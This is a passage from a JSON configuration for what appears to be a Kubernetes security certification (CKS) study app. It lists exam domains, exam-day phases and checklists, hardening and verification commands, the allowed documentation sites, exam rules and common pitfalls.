      "Protect node metadata and endpoints",
      "Verify platform binaries before deploying"
     ]
    },
    {
     "id": "cluster-hardening",
     "name": "Cluster Hardening",
     "weight": 15,
     "competencies": [
      "Use Role Based Access Controls to minimize exposure",
      "Exercise caution in using service accounts e.g. disable defaults, minimize permissions on newly created ones",
      "Restrict access to Kubernetes API",
      "Upgrade Kubernetes to avoid vulnerabilities"
     ]
    },
    {
     "id": "system-hardening",
     "name": "System Hardening",
     "weight": 10,
     "competencies": [
      "Minimize host OS footprint (reduce attack surface)",
      "Using least-privilege identity and access management",
      "Minimize external access to the network",
      "Appropriately use kernel hardening tools such as AppArmor, seccomp"
     ]
    },
    {
     "id": "minimize-microservice-vulnerabilities",
     "name": "Minimize Microservice Vulnerabilities",
     "weight": 20,
     "competencies": [
      "Use appropriate pod security standards",
      "Manage kubernetes secrets",
      "Understand and implement isolation techniques (multi-tenancy, sandboxed containers, etc.)",
      "Implement Pod-to-Pod encryption (Cilium, Istio)"
     ]
    },
    {
     "id": "supply-chain-security",
     "name": "Supply Chain Security",
     "weight": 20,
     "competencies": [
      "Minimize base image footprint",
      "Understand your supply chain (e.g. SBOM, CI/CD, artifact repositories)",
      "Secure your supply chain (permitted registries, sign and validate artifacts, etc.)",
      "Perform static analysis of user workloads and container images (e.g. Kubesec, KubeLinter)"
     ]
    },
    {
     "id": "monitoring-logging-runtime",
     "name": "Monitoring, Logging and Runtime Security",
     "weight": 20,
     "competencies": [
      "Perform behavioral analytics to detect malicious activities",
      "Detect threats within physical infrastructure, apps, networks, data, users and workloads",
      "Investigate and identify phases of attack and bad actors within the environment",
      "Ensure immutability of containers at runtime",
      "Use Kubernetes audit logs to monitor access"
     ]
    }
   ],
   "phases": [
    {
     "id": "preflight",
     "name": "Pre-flight (first 90 seconds)",
     "goal": "Spend 90 seconds buying back 15 minutes: shell aliases, a YAML-safe vim, the one allowed docs tab open, and a per-task budget on screen before you read task 1.",
     "items": [
      {
       "label": "Set the kubectl alias and the dry-run/force exports on the base node",
       "hint": "alias k=kubectl; export do='--dry-run=client -o yaml'; export now='--force --grace-period=0'"
      },
      {
       "label": "Wire bash completion through the alias (saves every long resource name you would otherwise type)",
       "hint": "source <(kubectl completion bash); complete -o default -F __start_kubectl k"
      },
      {
       "label": "Fix vim for YAML BEFORE editing your first manifest — tabs in a static pod manifest brick the control plane",
       "hint": "printf 'set expandtab tabstop=2 shiftwidth=2 softtabstop=2 number autoindent\\n' > ~/.vimrc"
      },
      {
       "label": "Open the single allowed documentation tab on kubernetes.io/docs and leave it there for the whole exam",
       "hint": ""
      },
      {
       "label": "List every context you will be moving between and note their names",
       "hint": "kubectl config get-contexts -o name"
      },
      {
       "label": "Compute the per-task budget (120 min, minus a 10-minute final sweep, divided by the task count) and write it on screen",
       "hint": "echo \"$(( (120 - 10) / 16 )) min per task\""
      },
      {
       "label": "Confirm the remote desktop copy/paste keys so you do not fight the terminal later: Ctrl+Shift+C / Ctrl+Shift+V inside the Linux terminal, plain Ctrl+C / Ctrl+V elsewhere",
       "hint": ""
      }
     ]
    },
    {
     "id": "triage",
     "name": "Triage sweep (minutes 2–8)",
     "goal": "Read every task once before solving any. Record each task's percentage weight and its target context, then attack in value order — not in the order the exam printed them.",
     "items": [
      {
       "label": "Read all 15–20 tasks. For each, write down: weight %, target context, target namespace, target node (if any)",
       "hint": ""
      },
      {
       "label": "Star the highest-weight tasks you are confident on — Supply Chain, Minimize Microservice Vulnerabilities and Monitoring/Runtime are 20% each and together are 60% of the exam",
       "hint": ""
      },
      {
       "label": "Mark every task that edits /etc/kubernetes/manifests (apiserver flags, audit policy, encryption-at-rest, admission plugins) as HIGH RISK — do them with a backup, and never last",
       "hint": ""
      },
      {
       "label": "Mark every task that needs SSH to a named node (AppArmor, seccomp profiles, kube-bench, Falco, kubelet config) — these cost a context switch AND an SSH round trip",
       "hint": ""
      },
      {
       "label": "Do not start any task until its context is recorded in your list",
       "hint": ""
      }
     ]
    },
    {
     "id": "task-loop",
     "name": "Per-task loop",
     "goal": "One task = one context switch, one generated manifest, one apply, one verification, and one honest decision to stay or flag and move on.",
     "items": [
      {
       "label": "STEP 1, always: run the context command the task gives you, then prove it took",
       "hint": "kubectl config use-context <CTX> && kubectl config current-context"
      },
      {
       "label": "If the task names a node, SSH there — and remember you must come back",
       "hint": "ssh <NODE>"
      },
      {
       "label": "Back up ANY file under /etc/kubernetes/manifests before you open it",
       "hint": "cp /etc/kubernetes/manifests/kube-apiserver.yaml /root/kube-apiserver.yaml.bak"
      },
      {
       "label": "Generate anything kubectl can generate; hand-write only NetworkPolicy, PSA labels and audit policy",
       "hint": "k create role <NAME> --verb=get,list --resource=pods -n <NS> $do > r.yaml"
      },
      {
       "label": "Don't guess field names — ask the API for the schema instead of burning a docs search",
       "hint": "k explain pod.spec.containers.securityContext --recursive | less"
      },
      {
       "label": "Apply — then VERIFY THE END STATE, because \"I applied the manifest\" is not \"the task passes\"",
       "hint": "k get po <POD> -n <NS> -o jsonpath='{.spec.containers[*].securityContext}{\"\\n\"}'"
      },
      {
       "label": "If the pod had to be recreated, confirm it is actually Running and not CrashLoopBackOff/CreateContainerError",
       "hint": "k get po -n <NS> -o wide"
      },
      {
       "label": "Return to the base node before the next task — nested SSH sessions are unsupported",
       "hint": "exit"
      },
      {
       "label": "Over budget? Stop. Flag the task, note the one thing that blocked you, and move to the next one. A 20% task you half-finish beats a 4% task you perfect.",
       "hint": ""
      }
     ]
    },
    {
     "id": "sweep",
     "name": "Review sweep (last 10 minutes)",
     "goal": "Re-verify the flagged tasks and prove you did not leave a cluster broken. A bricked control plane can cost you every task on that cluster, not just the one you were editing.",
     "items": [
      {
       "label": "For each cluster you touched: switch to it and confirm the API server is healthy",
       "hint": "kubectl config use-context <CTX> && kubectl get --raw='/readyz?verbose'"
      },
      {
       "label": "Confirm no control-plane static pod is down on any cluster you edited",
       "hint": "kubectl get po -n kube-system -o wide | grep -Ev 'Running|Completed'"
      },
      {
       "label": "Find anything you created that is not Running",
       "hint": "kubectl get po -A --field-selector=status.phase!=Running"
      },
      {
       "label": "Re-run the verification command for every flagged task, in that task's own context",
       "hint": ""
      },
      {
       "label": "Confirm each NetworkPolicy task still lets DNS out — a default-deny egress without a kube-system UDP/TCP 53 allow breaks everything downstream",
       "hint": "kubectl get netpol -A"
      },
      {
       "label": "Spend remaining time on the highest-weight unfinished task, never the easiest one",
       "hint": ""
      },
      {
       "label": "Leave every node you SSH'd into",
       "hint": "exit"
      }
     ]
    },
    {
     "id": "retro",
     "name": "Retrospective (after the exam, same day)",
     "goal": "There is no pentest report here. The artefact is an honest per-task retrospective written while it is still fresh — which tasks blew the budget and which domain leaked points.",
     "items": [
      {
       "label": "List every task that went over budget and the single reason it did",
       "hint": ""
      },
      {
       "label": "Total the weight of tasks you flagged or skipped, per domain — that is your real weak domain",
       "hint": ""
      },
      {
       "label": "List every command or field name you had to look up; each one is a flashcard",
       "hint": ""
      },
      {
       "label": "Record whether you ever forgot, or mis-ran, a context switch",
       "hint": ""
      },
      {
       "label": "Note anything the docs allow-list did NOT cover that you needed (Trivy flags, kube-bench targets, kubesec) — you must memorise those",
       "hint": ""
      }
     ]
    }
   ],
   "timeSavers": [
    {
     "label": "Alias + dry-run exports (do this before task 1)",
     "cmd": "alias k=kubectl; export do='--dry-run=client -o yaml'; export now='--force --grace-period=0'",
     "why": "Turns `kubectl create role x --dry-run=client -o yaml` into `k create role x $do`. Roughly 20–30 saved keystrokes per manifest across 16 tasks — several minutes, and far fewer typos. Set it again on every node you SSH into; it does not follow you."
    },
    {
     "label": "YAML-safe vim before the first edit",
     "cmd": "printf 'set expandtab tabstop=2 shiftwidth=2 softtabstop=2 number autoindent\\n' > ~/.vimrc",
     "why": "Without expandtab, vim inserts literal tabs — invalid YAML. In an ordinary manifest you get a parse error; in /etc/kubernetes/manifests/kube-apiserver.yaml the kubelet silently refuses to start the API server and the cluster is gone. Also remember `:set paste` before pasting from the docs tab."
    },
    {
     "label": "Context switch, verified",
     "cmd": "kubectl config use-context <CTX> && kubectl config current-context",
     "why": "Chaining the confirmation costs one second and eliminates the single most expensive failure in this exam. The `&&` means a bad context name fails loudly instead of leaving you on the previous cluster."
    },
    {
     "label": "Schema lookup instead of a docs search",
     "cmd": "kubectl explain pod.spec.containers.securityContext --recursive",
     "why": "Saves a 60–90 second round trip to the browser tab for every field name (capabilities.drop, readOnlyRootFilesystem, allowPrivilegeEscalation, seccompProfile.localhostProfile, appArmorProfile.type). Works offline, in the terminal, for any resource: `kubectl explain networkpolicy.spec --recursive`."
    },
    {
     "label": "See exactly which flags the API server is running with",
     "cmd": "ps -ef | grep kube-apiserver | tr ' ' '\\n' | grep -- '^--' | sort",
     "why": "Instant answer to \"is --audit-policy-file set / is NodeRestriction enabled / is anonymous-auth on\" without opening the 120-line static pod manifest. First command of every cluster-hardening and audit task."
    },
    {
     "label": "Pod Security Admission labels in one shot",
     "cmd": "kubectl label --overwrite ns <NS> pod-security.kubernetes.io/enforce=restricted pod-security.kubernetes.io/enforce-version=v1.34 pod-security.kubernetes.io/warn=restricted pod-security.kubernetes.io/audit=restricted",
     "why": "PodSecurityPolicy was removed in Kubernetes 1.25 — PSA namespace labels replaced it entirely. One labelling command does what a PSP + Role + RoleBinding used to. Pinning enforce-version makes the behaviour deterministic instead of tracking the cluster version."
    },
    {
     "label": "Dry-run a PSA label to see which running pods would violate it",
     "cmd": "kubectl label --dry-run=server --overwrite ns <NS> pod-security.kubernetes.io/enforce=restricted",
     "why": "The server returns a warning listing every existing pod that breaks the standard, without changing anything. This is the fastest way to answer the common task \"apply restricted and fix the offending workloads\" — it tells you which workloads to fix before you commit."
    },
    {
     "label": "RBAC least-privilege, generated and then proven",
     "cmd": "k create sa <SA> -n <NS>; k create role <ROLE> --verb=get,list,watch --resource=pods -n <NS> $do | kubectl apply -f -; k create rolebinding <RB> --role=<ROLE> --serviceaccount=<NS>:<SA> -n <NS>",
     "why": "Generating Role/RoleBinding beats hand-writing rules[].apiGroups every time. Note the binding flag is `--serviceaccount=<NS>:<SA>` (colon-separated), which is the syntax candidates most often fumble."
    },
    {
     "label": "Verify RBAC by impersonating the ServiceAccount",
     "cmd": "kubectl auth can-i --list --as=system:serviceaccount:<NS>:<SA> -n <NS>",
     "why": "The only honest verification of a least-privilege task. The subject MUST be the full `system:serviceaccount:<ns>:<sa>` form — passing just the SA name silently tests a non-existent user and returns a misleading answer. Use `kubectl auth can-i delete pods --as=... -n <NS>` to prove a permission is absent."
    },
    {
     "label": "Disable ServiceAccount token automount and prove it",
     "cmd": "kubectl patch sa <SA> -n <NS> -p '{\"automountServiceAccountToken\":false}'; kubectl exec <POD> -n <NS> -- ls /var/run/secrets/kubernetes.io/serviceaccount",
     "why": "The patch is a one-liner instead of an edit. The exec is the proof: it must fail with 'No such file or directory'. Existing pods keep their mounted token — the SA change only affects pods created afterwards, so recreate the pod. Also need `kubectl create token <SA> -n <NS>` since 1.24 stopped auto-creating token Secrets."
    },
    {
     "label": "Find every privileged / escalation-capable pod in one query",
     "cmd": "kubectl get po -A -o jsonpath='{range .items[*]}{.metadata.namespace}{\"\\t\"}{.metadata.name}{\"\\t\"}{.spec.containers[*].securityContext.privileged}{\"\\n\"}{end}' | grep true",
     "why": "Beats eyeballing `-o yaml` across namespaces. Swap the last path segment for `.allowPrivilegeEscalation`, `.runAsUser` or `.capabilities.add` to answer any 'find and fix the insecure workload' task in seconds."
    },
    {
     "label": "Prove an AppArmor profile is actually applied",
     "cmd": "kubectl exec <POD> -n <NS> -- cat /proc/1/attr/current",
     "why": "Returns e.g. `k8s-apparmor-example-deny-write (enforce)`. This is the verification step — a manifest that names a profile which is not loaded on the node leaves the pod in Blocked/CreateContainerError, and a pod that starts fine may still be `unconfined`. Since Kubernetes 1.31 the field is GA at `securityContext.appArmorProfile: {type: Localhost, localhostProfile: <name>}`; the old `container.apparmor.security.beta.kubernetes.io/<container>` annotation is deprecated. Load the profile on the node with `apparmor_parser -q /etc/apparmor.d/<file>` and list with `aa-status`."
    },
    {
     "label": "Prove a seccomp profile is actually applied",
     "cmd": "kubectl get po <POD> -n <NS> -o jsonpath='{.spec.securityContext.seccompProfile}{\"\\n\"}{.spec.containers[*].securityContext.seccompProfile}{\"\\n\"}'",
     "why": "Custom profiles live under the kubelet seccomp root `/var/lib/kubelet/seccomp/`, and `localhostProfile` is RELATIVE to that directory — `localhostProfile: profiles/audit.json` means `/var/lib/kubelet/seccomp/profiles/audit.json`. An absolute path is rejected. `type: RuntimeDefault` needs no file at all and answers most 'restrict syscalls' tasks in one line."
    },
    {
     "label": "Replace a pod whose securityContext you must change",
     "cmd": "kubectl get po <POD> -n <NS> -o yaml > /tmp/p.yaml && vim /tmp/p.yaml && kubectl replace --force -f /tmp/p.yaml",
     "why": "Most securityContext, seccomp, AppArmor and runtimeClassName fields are immutable — `kubectl edit` will refuse the change and you lose two minutes discovering that. `replace --force` deletes and recreates in one step."
    },
    {
     "label": "Static pod edit with an escape hatch",
     "cmd": "cp /etc/kubernetes/manifests/kube-apiserver.yaml /root/kube-apiserver.yaml.bak && vim /etc/kubernetes/manifests/kube-apiserver.yaml && watch crictl ps --name kube-apiserver",
     "why": "The kubelet restarts the component the moment you save. `crictl ps` shows it coming back; if it never does, `mv` the manifest to /tmp, wait, and restore the backup. Diagnose with `crictl ps -a --name kube-apiserver` then `crictl logs <ID>`, or read `/var/log/pods/kube-system_kube-apiserver-*/kube-apiserver/*.log` — the kubelet's own `journalctl -u kubelet -f` only shows the manifest parse error."
    },
    {
     "label": "Audit policy: the flags AND the mounts",
     "cmd": "kubectl get --raw='/readyz?verbose' ; tail -n 20 /var/log/kubernetes/audit/audit.log",
     "why": "An audit task needs four apiserver flags (--audit-policy-file, --audit-log-path, --audit-log-maxage, --audit-log-maxbackup, --audit-log-maxsize) PLUS a hostPath volume and volumeMount for both the policy file and the log directory. Miss the mounts and the API server crashloops with 'no such file or directory'. These two commands are the only proof the task passed: the API server is ready, and events are landing in the log."
    },
    {
     "label": "Falco: validate before you restart, then read the alerts",
     "cmd": "falco --validate /etc/falco/falco_rules.local.yaml && systemctl restart falco && journalctl -fu falco",
     "why": "Falco refuses to start on an invalid rule file — validating first turns a dead service into a two-second fix. Custom rules belong in /etc/falco/falco_rules.local.yaml or /etc/falco/rules.d/ (never edit the shipped /etc/falco/falco_rules.yaml). Output fields you will be asked for: %evt.time %user.name %container.id %container.image.repository %proc.name %fd.name %k8s.ns.name %k8s.pod.name. Falco docs ARE on the exam allow-list — use them."
    },
    {
     "label": "Trivy: severity-gated scan, quiet output",
     "cmd": "trivy image --severity HIGH,CRITICAL --ignore-unfixed --quiet <IMAGE>:<TAG>",
     "why": "Trivy docs are NOT on the CKS allow-list — you must know these flags from memory. `--quiet` kills the progress bars that swamp the terminal, `--ignore-unfixed` drops CVEs you cannot act on. For the classic 'delete every pod running a CRITICAL image' task: `for i in $(kubectl get po -n <NS> -o jsonpath='{.items[*].spec.containers[*].image}'); do echo \"== $i\"; trivy image --severity CRITICAL --quiet $i; done`. Also `trivy k8s --report summary cluster` and `trivy config <PATH>` for manifests."
    },
    {
     "label": "kube-bench: read the Remediation block, do not invent one",
     "cmd": "kube-bench run --targets master,node | grep -B2 -A8 '\\[FAIL\\]'",
     "why": "kube-bench prints the exact remediation text for every failed check — copying it is faster and more accurate than reasoning about CIS numbering. Target `master` on control-plane nodes and `node` on workers; add `etcd,policies` when the task names them. Narrow to one finding with `kube-bench run --targets master --check 1.2.5`. Remember apiserver fixes go in /etc/kubernetes/manifests/kube-apiserver.yaml but kubelet fixes go in /var/lib/kubelet/config.yaml and need `systemctl restart kubelet`."
    },
    {
     "label": "NetworkPolicy default-deny (there is no generator — memorise it)",
     "cmd": "kubectl create ns <NS>; cat <<'EOF' | kubectl apply -f -\napiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: default-deny-all\n  namespace: <NS>\nspec:\n  podSelector: {}\n  policyTypes: [\"Ingress\",\"Egress\"]\nEOF",
     "why": "kubectl cannot generate NetworkPolicy, so this is the one manifest worth knowing by heart — it appears in Cluster Setup (15%) almost every sitting. `podSelector: {}` means all pods; listing both policyTypes with no rules blocks both directions. Then add allow policies; they are additive (union), never ordered."
    },
    {
     "label": "Encryption at rest: re-encrypt what already exists",
     "cmd": "kubectl get secrets -A -o json | kubectl replace -f -",
     "why": "Adding --encryption-provider-config to the API server only encrypts Secrets written AFTER the change. Existing Secrets stay in plaintext in etcd and the task will fail its check. This one-liner rewrites every Secret through the new provider. Verify directly in etcd with `ETCDCTL_API=3 etcdctl --cacert=/etc/kubernetes/pki/etcd/ca.crt --cert=/etc/kubernetes/pki/etcd/server.crt --key=/etc/kubernetes/pki/etcd/server.key get /registry/secrets/<NS>/<SECRET> | hexdump -C | head` — etcd docs are on the allow-list."
    },
    {
     "label": "Sandboxed containers via RuntimeClass, verified",
     "cmd": "kubectl get runtimeclass && kubectl exec <POD> -n <NS> -- dmesg | head -n 3",
     "why": "Check which RuntimeClass names exist before writing `runtimeClassName: gvisor` into the pod spec — guessing the name costs a failed pod. gVisor identifies itself in `dmesg` output, which is the verification the task actually wants."
    }
   ],
   "allowedDocs": [
    {
     "label": "Kubernetes Documentation",
     "url": "https://kubernetes.io/docs/",
     "note": "Primary reference. Using the site's own search function is allowed, but you must NOT open external search results. Subdomains and localised translations are permitted; the English version is recommended."
    },
    {
     "label": "Kubernetes Blog",
     "url": "https://kubernetes.io/blog/",
     "note": "Allowed. Useful for release-note behaviour changes (PSP removal, AppArmor GA)."
    },
    {
     "label": "Falco Documentation",
     "url": "https://falco.org/docs/",
     "note": "ALLOWED for CKS (not for CKA). Rule syntax, condition fields and output field reference are all in scope — lean on this rather than memorising %-field names."
    },
    {
     "label": "etcd Documentation",
     "url": "https://etcd.io/docs/",
     "note": "ALLOWED for CKS. Covers etcdctl flags for inspecting encryption-at-rest and etcd TLS/auth hardening."
    },
    {
     "label": "Kubernetes SIGs bom CLI reference",
     "url": "https://kubernetes-sigs.github.io/bom/cli-reference/",
     "note": "ALLOWED for CKS. The SBOM generation tool for Supply Chain Security tasks."
    },
    {
     "label": "NGINX Ingress Controller — NGINX Configuration",
     "url": "https://kubernetes.github.io/ingress-nginx/user-guide/nginx-configuration/",
     "note": "ALLOWED for CKS, but only this user-guide/nginx-configuration path. For Ingress-with-TLS tasks."
    },
    {
     "label": "Cilium Documentation",
     "url": "https://docs.cilium.io/en/stable",
     "note": "ALLOWED for CKS. CiliumNetworkPolicy, transparent encryption and pod-to-pod encryption tasks."
    },
    {
     "label": "Istio Documentation",
     "url": "https://istio.io/latest/docs/",
     "note": "ALLOWED for CKS. mTLS / PeerAuthentication for pod-to-pod encryption tasks."
    },
    {
     "label": "NOT ALLOWED — Trivy, kube-bench, kubesec, KubeLinter, gVisor, OPA/Gatekeeper, Kyverno, AppArmor, seccomp, cosign",
     "url": "",
     "note": "None of these vendor sites are on the published CKS allow-list even though the tools are squarely in the curriculum. You must know Trivy flags, kube-bench targets, kubesec/KubeLinter invocation and AppArmor/seccomp profile syntax from memory, or from `--help` inside the exam terminal. `kubectl explain` covers the Kubernetes-side fields."
    },
    {
     "label": "NOT ALLOWED — helm.sh/docs and gateway-api.sigs.k8s.io",
     "url": "",
     "note": "These are on the CKA allow-list but NOT the CKS one. Do not assume CKA's list carries over — CKS trades Helm and Gateway API for Falco, etcd, bom, ingress-nginx, Cilium and Istio."
    }
   ],
   "rules": [
    {
     "kind": "required",
     "text": "Every task names the environment it must be performed in — switch first, every time, and confirm it took. [This is exam-day practice reported by candidates, not text the Linux Foundation publishes: its instructions page describes an SSH-host model and says nothing about cluster contexts.]",
     "enforceable": "The app makes context a required field on every task, blocks the task timer from starting until the user confirms the context, and keeps a persistent 'CURRENT CONTEXT' banner visible for the whole session.",
     "source": "",
     "confidence": "inferred"
    },
    {
     "kind": "required",
     "text": "After SSHing to a node to complete a task, return to the base node before starting the next task. Nested SSH sessions are not supported.",
     "enforceable": "Per-task checklist item 'returned to base node' that must be ticked before the task can be marked complete.",
     "source": "https://docs.linuxfoundation.org/tc-docs/certification/important-instructions-cks",
     "confidence": "official"
    },
    {
     "kind": "limited",
     "text": "Documentation is restricted to a fixed allow-list of URLs: kubernetes.io/docs, kubernetes.io/blog, falco.org/docs, etcd.io/docs, kubernetes-sigs.github.io/bom/cli-reference, kubernetes.github.io/ingress-nginx/user-guide/nginx-configuration, docs.cilium.io/en/stable, istio.io/latest/docs. Searching within kubernetes.io/docs is allowed, but you must not open external search results.",
     "enforceable": "Ship the allow-list as one-click bookmarks in the session panel and visually mark any other reference the app shows as 'not exam-legal', so practice habits match exam conditions.",
     "source": "https://docs.linuxfoundation.org/tc-docs/certification/certification-resources-allowed",
     "confidence": "official"
    },
    {
     "kind": "banned",
     "text": "No notes, no unauthorized materials, no second monitor. The desk must be clear of all notes and electronics, and you may not write or enter input on anything outside the exam console screen.",
     "enforceable": "Nothing the app can enforce — but it should refuse to present itself as an in-exam companion and label practice mode explicitly, so the user never builds a habit of reaching for it mid-task.",
     "source": "https://docs.linuxfoundation.org/tc-docs/certification/lf-handbook2/exam-rules-and-policies",
     "confidence": "official"
    },
    {
     "kind": "required",
     "text": "Prerequisite: the CKA exam must have been taken and passed before attempting CKS. Since 15 Oct 2024 a CKA in Achieved, Renewed OR Expired status all qualify — it does not have to be Active.",
     "enforceable": "Show this as a one-time eligibility note when the CKS preset is first selected; nothing ongoing to track.",
     "source": "https://training.linuxfoundation.org/blog/now-updated-cks-exam/",
     "confidence": "official"
    },
    {
     "kind": "allowed",
     "text": "Copy/paste inside the exam's Linux terminal uses Ctrl+Shift+C and Ctrl+Shift+V; other applications in the remote desktop use plain Ctrl+C/Ctrl+V. The INSERT key is prohibited within the Remote Desktop.",
     "enforceable": "Show the key bindings in the pre-flight phase so the user is not rediscovering them on task 1; render the app's own copy buttons with a reminder of the in-exam equivalent.",
     "source": "https://docs.linuxfoundation.org/tc-docs/certification/important-instructions-cks",
     "confidence": "official"
    },
    {
     "kind": "limited",
     "text": "120 minutes total for 15–20 performance-based tasks; 67% is required to pass. The exam UI shows a countdown with alerts at 30, 15 and 5 minutes remaining.",
     "enforceable": "Compute and display a per-task budget (total minutes minus a reserved sweep window, divided by task count), run a per-task countdown, and fire the same 30/15/5 global alerts so the rhythm is rehearsed.",
     "source": "https://docs.linuxfoundation.org/tc-docs/certification/important-instructions-cks",
     "confidence": "official"
    },
    {
     "kind": "allowed",
     "text": "Certification is valid for 2 years and one retake is included with the exam purchase.",
     "enforceable": "Surface as context in the retrospective, not as a live rule.",
     "source": "https://training.linuxfoundation.org/certification/certified-kubernetes-security-specialist/",
     "confidence": "official"
    },
    {
     "kind": "allowed",
     "confidence": "official",
     "text": "Elevated privileges are available on any host via `sudo -i`. Half the CKS curriculum — kubelet config, etcd encryption at rest, AppArmor profile loading, CIS remediation on control-plane manifests — is unreachable without it.",
     "enforceable": "",
     "source": "https://docs.linuxfoundation.org/tc-docs/certification/important-instructions-cks"
    }
   ],
   "pitfalls": [
    {
     "text": "Performing a task in the WRONG CLUSTER CONTEXT. Every CKS task names its context in the first line, and candidates skip it — especially after a task that made them SSH to a node, because the return `exit` lands them on the base node still pointed at the previous cluster.",
     "cost": "The entire task scores zero even when the work was technically perfect, and you often do not notice until the review sweep. On a 20%-weight task that is a third of your pass margin.",
     "guard": "Make `context` a mandatory field on every task. Block the per-task timer until the user pastes/confirms the context command. Keep a persistent, high-contrast CURRENT CONTEXT banner; change its colour when the task's declared context differs from the last confirmed one."
    },
    {
     "text": "A typo in a static pod manifest under /etc/kubernetes/manifests bricks the control plane. The kubelet restarts the component the instant you save — a tab character, a misaligned flag, or a missing quote and the API server never comes back. Most candidates edit without a backup and without knowing how to read the logs of a pod whose API server is dead.",
     "cost": "Every remaining task on that cluster becomes unanswerable, and panic burns 15–25 minutes. This is the single most catastrophic failure mode in CKS.",
     "guard": "Auto-insert a 'back up the manifest' pre-step into any task the user tags as touching /etc/kubernetes/manifests, and pin a recovery card: `mv` the manifest to /tmp, confirm the kubelet settles, restore the backup; diagnose with `crictl ps -a --name kube-apiserver`, `crictl logs <ID>`, `/var/log/pods/kube-system_kube-apiserver-*/`, and `journalctl -u kubelet` for manifest parse errors."
    },
    {
     "text": "Audit policy configured with the API server flags but WITHOUT the hostPath volume and volumeMount for the policy file and the log directory. The apiserver then crashloops on 'no such file or directory' and the candidate blames the policy YAML.",
     "cost": "Loses the audit task (part of a 20% domain) and usually takes the cluster down with it, so it cascades into pitfall #2.",
     "guard": "Give the audit task a four-part checklist — policy file written, --audit-policy-file + --audit-log-path flags added, hostPath volumes added, volumeMounts added — and make 'apiserver /readyz returns ok AND audit.log is growing' the verification step, not 'file saved'."
    },
    {
     "text": "NetworkPolicy misunderstood as ordered/deny-capable. Policies are purely additive: there is no deny rule, no priority, no ordering. A 'default-deny' policy plus an 'allow' policy means the allow wins for the pods it selects. Separately, a policy listing only `ingress:` rules does NOT restrict egress unless `policyTypes` explicitly includes `Egress`.",
     "cost": "The task's connectivity check fails in one direction. Candidates re-read their (correct) YAML three times looking for a syntax error.",
     "guard": "Ship a NetworkPolicy verification snippet as the task's verify step (a test pod doing `wget --timeout=2 -qO- <svc>` from inside and outside the selected namespace), and a reference card stating the additive/union semantics and the policyTypes rule explicitly."
    },
    {
     "text": "Default-deny egress applied without allowing DNS. Blocking egress cuts off UDP/TCP 53 to kube-dns, so every subsequent name resolution in that namespace fails — including in pods created by later tasks.",
     "cost": "Breaks the current task's connectivity check and silently poisons later tasks in the same namespace. Extremely hard to diagnose under time pressure.",
     "guard": "Attach a standing 'allow DNS' egress block to the default-deny snippet, and add 'DNS still resolves from the namespace' to the review sweep checklist."
    },
    {
     "text": "Applying Pod Security Admission labels to a namespace and assuming existing workloads are now compliant. PSA is an admission-time control only — pods already running are never evicted or re-evaluated. PodSecurityPolicy no longer exists (removed in Kubernetes 1.25), so candidates who studied older material write PSPs that the API server rejects outright.",
     "cost": "The task's check inspects the running pods, not the namespace labels, so a correctly-labelled namespace still fails.",
     "guard": "Make the PSA task's verify step 'no non-compliant pods are running', and surface `kubectl label --dry-run=server --overwrite ns <NS> pod-security.kubernetes.io/enforce=restricted` as the tool that lists which existing pods would violate."
    },
    {
     "text": "Seccomp `localhostProfile` given as an absolute path. It is relative to the kubelet's seccomp root, `/var/lib/kubelet/seccomp/` — so the value is `profiles/audit.json`, not `/var/lib/kubelet/seccomp/profiles/audit.json`. The profile must also exist on the node the pod actually schedules onto.",
     "cost": "Pod sits in CreateContainerError. Candidates rewrite the manifest repeatedly instead of fixing the path form.",
     "guard": "Store the path rule alongside the seccomp snippet, and make the verify step read the applied `.spec.containers[*].securityContext.seccompProfile` from the live pod plus confirm the pod is Running."
    },
    {
     "text": "Using the deprecated AppArmor annotation `container.apparmor.security.beta.kubernetes.io/<container>` instead of the GA field `securityContext.appArmorProfile` (stable since Kubernetes 1.31), or naming a profile that was never loaded on the node with `apparmor_parser`.",
     "cost": "On a v1.35 exam cluster the annotation is ignored — the pod starts unconfined and the check fails. An unloaded profile leaves the pod Blocked/CreateContainerError.",
     "guard": "Default the app's AppArmor snippet to the `appArmorProfile` field form, flag the annotation form as deprecated wherever it appears, and pin `kubectl exec <POD> -- cat /proc/1/attr/current` as the mandatory verify step."
    },
    {
     "text": "Treating 'I applied the manifest' as 'the task passes'. No verification step at all — no check that the pod is Running, that the field survived, or that the connectivity/permission actually changed.",
     "cost": "Silent zeros. You feel like you finished 15 tasks and score 50%.",
     "guard": "This is the app's core value for this track: make a per-task VERIFY field mandatory, pre-populate it with the right command for the task type, and refuse to mark a task 'done' (only 'applied') until the verification output is recorded."
    },
    {
     "text": "Trying to `kubectl edit` an existing pod to add securityContext, seccompProfile, appArmorProfile or runtimeClassName. Those fields are immutable on a running pod.",
     "cost": "Two to three minutes lost per occurrence, plus the confidence hit of a rejected edit under a countdown.",
     "guard": "Pin `kubectl get po <POD> -o yaml > /tmp/p.yaml; vim /tmp/p.yaml; kubectl replace --force -f /tmp/p.yaml` as the standard mutation recipe for any pod-security task, and list the immutable fields on the same card."
    },
    {
     "text": "Needing Trivy, kube-bench, kubesec or KubeLinter flags mid-task and discovering their docs are NOT on the CKS allow-list. Only kubernetes.io, falco.org, etcd.io, the bom CLI reference, ingress-nginx's nginx-configuration page, docs.cilium.io and istio.io are permitted.",
     "cost": "Minutes burned on `--help` output, or a scan run with wrong severity/scanner flags that returns the wrong answer to a 20%-domain Supply Chain task.",
     "guard": "Ship these tool flag sets as memorisation cards in the preset, visually separated from the exam-legal bookmarks, and drill them in practice mode with the docs bookmarks disabled."
    },
    {
     "text": "Disabling ServiceAccount token automount on the ServiceAccount but leaving the already-running pod in place, or setting it on the SA while the pod spec sets `automountServiceAccountToken: true` (the pod-level value wins).",
     "cost": "The check execs into the pod, finds /var/run/secrets/kubernetes.io/serviceaccount still mounted, and fails the task.",
     "guard": "Pair the patch command with the recreate step and the exec-based proof in a single task template; note the pod-level-overrides-SA precedence rule on the card."
    },
    {
     "text": "RBAC verified with the wrong impersonation subject — `--as=<sa-name>` instead of `--as=system:serviceaccount:<NS>:<SA>`. The short form tests a user that does not exist and cheerfully returns 'no', which looks like a correct least-privilege result.",
     "cost": "A permissive Role ships believing it was verified. Loses the Cluster Hardening task (15% domain).",
     "guard": "Store the full impersonation form as the only RBAC verify snippet in the preset, with the `<NS>:<SA>` placeholders pre-filled from the task's own namespace field."
    },
    {
     "text": "Falco: editing the shipped /etc/falco/falco_rules.yaml instead of /etc/falco/falco_rules.local.yaml or /etc/falco/rules.d/, omitting a required rule key (condition, output, priority) so the file is invalid, or forgetting to restart the service after a change.",
